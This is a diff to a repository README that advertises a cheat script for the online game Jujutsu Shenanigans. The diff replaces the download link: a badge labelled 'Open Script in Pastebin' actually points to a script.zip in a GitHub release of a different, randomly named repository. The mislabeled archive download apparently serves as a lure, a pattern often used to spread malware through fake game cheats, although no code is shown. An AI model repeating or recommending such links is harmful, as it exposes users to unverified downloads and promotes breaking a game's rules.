@@ -5,12 +5,12 @@
 # [ OP UPDATE ] JUJUTSU SHENANIGANS SCRIPT/HACK | AUTO COMBO, AUTO BLOCK & MORE! | PASTEBIN 2025 / PC
 
 <div style="text-align: center">
-  <a href="https://github.com/Fisch-Scripts-Roblox/Fisch-Script/releases/download/new/script.zip">
+  <a href="https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip">
     <img class="bumbum" style="width: 1000px" alt="Static Badge" src="https://img.shields.io/badge/Click_For-_Open_Script_in_Pastebin!-purple">
   </a>
 </div>
 
-![image](https://github.com/user-attachments/assets/831311ca-1d79-4cbc-be48-3be2527b5110)
+![image](https://github.com/user-attachments/assets/1db49c8c-c609-434a-b634-67d2fed4f15f)
 
 ![maxresdefault](https://github.com/user-attachments/assets/5a0a43b2-e267-41e4-b3df-526ce7b36550)
 
